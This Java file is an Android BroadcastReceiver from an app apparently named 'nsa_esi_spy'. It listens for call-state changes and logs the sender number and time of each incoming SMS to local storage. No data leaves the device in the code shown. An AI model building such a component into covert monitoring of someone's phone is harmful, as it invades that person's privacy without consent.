package com.tdm5.esi.nsa_esi_spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.provider.Telephony;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Douaa on 12/05/2017.
 */
public class ServiceReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {

        MyPhoneStateListener phoneListener = new MyPhoneStateListener(context);

        MissActionSaver saver = new MissActionSaver();

        TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {

            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                //String messageBody = smsMessage.getMessageBody();

                Date dNow = new Date();

                SimpleDateFormat ft =
                        new SimpleDateFormat("E dd.MM.yyyy 'at' hh:mm:ss a ");

                String sender = smsMessage.getOriginatingAddress();

                Log.i("SMS from : ", sender+" "+ ft.format(dNow));

                saver.save(context,"SMS from "+sender+" "+ ft.format(dNow));




            }
        }

    }

}

